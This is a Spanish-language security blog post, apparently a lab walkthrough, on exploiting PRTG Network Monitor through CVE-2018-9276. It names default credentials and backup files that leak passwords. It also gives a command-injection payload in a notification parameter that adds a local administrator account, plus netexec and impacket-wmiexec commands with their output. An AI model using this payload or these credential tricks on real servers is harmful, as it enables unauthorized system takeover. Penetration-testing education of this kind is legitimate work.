---
date: 2025-11-12T20:48:05.000Z
layout: post
comments: true
title: "Hacking PRTG Network Monitor"
subtitle: 'Tipos de ataque'
description: >-
image: >-
  /images/prtglogo.png
optimized_image: >-
  /images/prtglogo.png
category: ciberseguridad
tags:
  - web
  - rce
  - owasp
  - cve-2018-9276
author: Felipe Canales Cayuqueo
paginate: true
---

PRTG Network Monitor es una herramienta de monitoreo de red desarrollada por Paessler AG que permite supervisar en tiempo real el estado y el rendimiento de dispositivos, servidores, aplicaciones y servicios dentro de una infraestructura TI. Utiliza protocolos como SNMP, WMI, NetFlow y HTTP para recopilar métricas relacionadas con el uso de ancho de banda, la carga de CPU, la disponibilidad de servicios y otros indicadores críticos. Su interfaz gráfica facilita la visualización mediante alertas y paneles personalizados, lo que ayuda a los administradores a detectar fallos o cuellos de botella de manera temprana y a mantener la estabilidad y eficiencia de la red.  

Normalmente, PRTG puede encontrarse expuesto en puertos web comunes como 80, 443 u 8080, donde pueden existir credenciales por defecto como ```prtgadmin:prtgadmin```. Otra forma es encontrar credenciales débiles o incluso recuperar contraseñas a través de un error interno que provoca que algunas de ellas quedaran almacenadas en texto claro dentro de archivos de respaldo de configuración. Algunos ejemplos de estos archivos son:

- C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old  
- C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.nul  
- C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old.bak  
- C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.dat  


### CVE-2018-9276

Se descubrió un problema en PRTG Network Monitor antes de la versión 18.2.39 en que un atacante que tenga acceso a la consola web PRTG System Administrator con privilegios administrativos puede explotar una vulnerabilidad de inyección de comandos del sistema operativo (tanto en el servidor como en los dispositivos) enviando parámetros malformados en escenarios de gestión de sensores o notificaciones. En este caso se detecta una aplicación web con una versión vulnerable.

[![prtg1](/images/prtg1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/prtg1.png)

Una vez autenticados, debemos dirigirnos a “Setup”, luego a “Account Settings” y finalmente a “Notifications”.

[![prtg2](/images/prtg2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/prtg2.png)

En esta sección debemos añadir una notificación nueva.

[![prtg3](/images/prtg3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/prtg3.png)

Luego le asignaremos un nombre descriptivo a esta notificación. Después, descendemos hasta el apartado “Execute Program”, donde seleccionaremos la opción “Demo exe notification – outfile.ps1”. En el campo de parámetros, inyectaremos el comando que nos permita crear un nuevo usuario con privilegios de administrador y guardaremos los cambios.

```
test.txt;net user pwned Prueba_123! /add;net localgroup administrators pwned /add
```

[![prtg4](/images/prtg4.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/prtg4.png)

Finalmente validamos que se haya creado correctamente la notificación y comprobamos las credenciales con ```netexec```.

[![prtg5](/images/prtg5.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/prtg5.png)

Si no funciona, manualmente debemos enviar una prueba de la notificación.

[![prtg6](/images/prtg6.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/prtg6.png)


```
┌──(root㉿nptg)-[/prtg]
└─# netexec smb 10.129.201.50 -u 'pwned' -p 'Prueba_123!'
SMB         10.129.201.50   445    APP03            [*] Windows 10 / Server 2019 Build 17763 x64 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False) 
SMB         10.129.201.50   445    APP03            [+] APP03\pwned:Prueba_123! (Pwn3d!)

```

Para acceder con este usuario podemos usar la herrmienta ```wmiexec``` de la siguiente forma:

```
┌──(root㉿nptg)-[/prtg]
└─# impacket-wmiexec 'pwned':'Prueba_123!'@10.129.201.50
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
app03\pwned

C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is 4695-E565

 Directory of C:\

10/11/2021  09:19 AM             1,024 .rnd
08/16/2021  06:42 PM    <DIR>          inetpub
09/28/2021  05:39 PM    <DIR>          loot
09/14/2018  11:19 PM    <DIR>          PerfLogs
10/11/2021  09:22 AM    <DIR>          Program Files
08/27/2021  12:30 PM    <DIR>          Program Files (x86)
08/16/2021  06:43 PM    <DIR>          Users
11/12/2025  04:45 PM    <DIR>          Windows
               1 File(s)          1,024 bytes
               7 Dir(s)  24,496,431,104 bytes free

C:\>

```
